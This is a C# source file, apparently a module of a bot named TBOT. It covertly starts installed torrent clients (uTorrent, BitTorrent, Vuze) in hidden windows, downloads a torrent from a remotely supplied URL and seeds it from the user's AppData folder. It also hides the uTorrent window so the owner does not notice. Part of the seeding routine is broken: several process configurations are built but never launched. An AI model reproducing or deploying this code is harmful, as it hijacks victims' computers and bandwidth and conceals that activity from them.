using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace TBOT;

internal class utSeed
{
	private const int SW_HIDE = 0;

	public static string UTorrentPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\uTorrent\\uTorrent.exe";

	public static string UTorrentPath2 = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\uTorrent\\uTorrent.exe").Replace("Program Files", "Program Files (x86)");

	public static string BitTorrentPath = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\BitTorrent\\Bittorrent.exe").Replace("Program Files", "Program Files (x86)");

	public static string BitTorrentPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\BitTorrent\\Bittorrent.exe";

	public static string VuzePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Vuze\\Azureus.exe";

	public static string VuzePath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Vuze\\Azureus.exe";

	public static string LocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\uTorrent\\";

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public static void Run()
	{
		if (File.Exists(UTorrentPath))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = UTorrentPath;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
		}
		else if (File.Exists(UTorrentPath2))
		{
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = UTorrentPath2;
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo2);
		}
		else if (File.Exists(BitTorrentPath))
		{
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.FileName = BitTorrentPath;
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo3);
		}
		else if (File.Exists(BitTorrentPath2))
		{
			ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
			processStartInfo4.FileName = BitTorrentPath2;
			processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo4);
		}
		if (File.Exists(VuzePath))
		{
			ProcessStartInfo processStartInfo5 = new ProcessStartInfo();
			processStartInfo5.FileName = VuzePath;
			processStartInfo5.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo5);
		}
		else if (File.Exists(VuzePath2))
		{
			ProcessStartInfo processStartInfo6 = new ProcessStartInfo();
			processStartInfo6.FileName = VuzePath2;
			processStartInfo6.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo6);
		}
	}

	public static bool Check()
	{
		if (!File.Exists(UTorrentPath) && !File.Exists(UTorrentPath2) && !File.Exists(BitTorrentPath) && !File.Exists(BitTorrentPath2) && !File.Exists(VuzePath) && !File.Exists(VuzePath2))
		{
			return false;
		}
		return true;
	}

	public static void SeedIt(string torrentUrl, string utorrentSavePath)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(torrentUrl, "\\" + utorrentSavePath);
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = UTorrentPath;
			processStartInfo.Arguments = "/DIRECTORY " + LocalPath + " " + utorrentSavePath;
			Process.Start(processStartInfo);
		}
		catch
		{
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = UTorrentPath2;
			processStartInfo2.Arguments = "/DIRECTORY " + LocalPath + " " + utorrentSavePath;
			Process.Start(processStartInfo2);
		}
		ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
		processStartInfo3.FileName = BitTorrentPath;
		processStartInfo3.Arguments = "/DIRECTORY" + LocalPath + " " + utorrentSavePath;
		ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
		processStartInfo4.FileName = BitTorrentPath2;
		processStartInfo4.Arguments = "/DIRECTORY" + LocalPath + " " + utorrentSavePath;
		ProcessStartInfo processStartInfo5 = new ProcessStartInfo();
		processStartInfo5.FileName = VuzePath;
		processStartInfo5.Arguments = "/DIRECTORY" + LocalPath + " " + utorrentSavePath;
		ProcessStartInfo processStartInfo6 = new ProcessStartInfo();
		processStartInfo6.FileName = VuzePath2;
		processStartInfo6.Arguments = "/DIRECTORY" + LocalPath + " " + utorrentSavePath;
		Thread.Sleep(2000);
	}

	public static void HideIt()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains("uTorrent"))
			{
				try
				{
					int hwnd = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd, 0);
				}
				catch
				{
				}
			}
		}
	}
}
